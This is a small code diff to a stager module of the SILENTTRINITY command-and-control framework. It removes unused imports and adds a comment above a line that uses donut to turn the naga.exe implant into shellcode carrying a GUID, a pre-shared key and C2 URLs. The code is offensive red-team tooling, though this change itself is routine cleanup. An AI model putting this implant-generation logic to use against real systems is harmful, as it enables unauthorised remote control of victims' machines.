@@ -1,10 +1,8 @@
 import os
 import donut
 import uuid
-from silenttrinity.core.events import Events
-from silenttrinity.core.teamserver import ipc_server
 from silenttrinity.core.teamserver.crypto import gen_stager_psk
-from silenttrinity.core.utils import shellcode_to_int_byte_array, print_bad, get_path_in_package, print_good, shellcode_to_hex_byte_array
+from silenttrinity.core.utils import shellcode_to_int_byte_array, shellcode_to_hex_byte_array, get_path_in_package
 from silenttrinity.core.teamserver.stager import Stager
 
 class STStager(Stager):
@@ -46,6 +44,7 @@ class STStager(Stager):
         elif self.options['Architecture']['Value'] == 'x86':
             arch = 1
 
+        # Create the shellcode using donut
         donut_shellcode = donut.create(file=get_path_in_package('core/teamserver/data/naga.exe'), params=f"{guid};{psk};{c2_urls}", arch=arch)
 
         if self.options['Format']['Value'] == 'raw':
